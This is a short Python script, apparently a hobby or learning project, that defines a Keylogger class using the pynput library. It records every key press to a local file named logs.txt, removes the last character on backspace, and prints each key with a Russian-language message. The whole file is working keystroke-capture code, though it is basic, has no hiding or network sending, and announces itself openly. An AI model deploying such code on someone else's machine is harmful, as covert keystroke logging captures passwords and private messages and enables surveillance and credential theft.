from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.filename = 'logs.txt'

    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def press(self, key):
        if key == keyboard.Key.backspace:
                with open(self.filename, 'r') as logs:
                    content = logs.read()
                content = content[:-1]
                with open(self.filename, 'w') as logs:
                    logs.write(content)
        else:
            with open(self.filename, 'a') as logs:
                logs.write(self.get_char(key) + ' ')
            print(f"Нажата клавиша: {self.get_char(key)}")

    def listener(self):
        with keyboard.Listener(on_press=self.press) as listen:
            listen.join()


if __name__ == '__main__':
    Keylogger().listener()
